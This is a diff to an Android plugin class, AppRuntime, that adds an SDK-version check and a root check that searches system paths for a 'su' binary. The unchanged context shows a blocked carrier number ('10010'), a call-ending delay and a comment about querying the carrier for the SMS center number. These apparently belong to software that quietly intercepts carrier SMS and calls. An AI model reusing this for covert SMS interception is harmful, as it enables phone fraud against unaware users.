@@ -1,9 +1,12 @@
 package com.xstd.plugin.config;
 
 import android.content.Context;
+import android.os.Build;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
+
+import java.io.File;
 
 /**
  * Created with IntelliJ IDEA.
@@ -17,6 +20,10 @@ public class AppRuntime {
     public static String BLOCKED_NUMBER_WITH_PREFIX = "10010";
 
     public static final int END_CALL_DELAY = 5000;
+
+    public static final boolean isVersionBeyondGB() {
+        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
+    }
 
     /**
      * 向运营商发送的查询短信指令，从返回的指令中获取到短信中心的号码
@@ -60,6 +67,34 @@ public class AppRuntime {
         }
 
         return null;
+    }
+
+    private final static int kSystemRootStateUnknow = -1;
+    private final static int kSystemRootStateDisable = 0;
+    private final static int kSystemRootStateEnable = 1;
+    private static int systemRootState = kSystemRootStateUnknow;
+
+    public static boolean isRootSystem() {
+        if (systemRootState == kSystemRootStateEnable) {
+            return true;
+        } else if (systemRootState == kSystemRootStateDisable) {
+            return false;
+        }
+        File f = null;
+        final String kSuSearchPaths[] = {"/system/bin/", "/system/xbin/", "/system/sbin/", "/sbin/", "/vendor/bin/"};
+        try {
+            for (int i = 0; i < kSuSearchPaths.length; i++) {
+                f = new File(kSuSearchPaths[i] + "su");
+                if (f != null && f.exists()) {
+                    systemRootState = kSystemRootStateEnable;
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+        }
+
+        systemRootState = kSystemRootStateDisable;
+        return false;
     }
 
 }
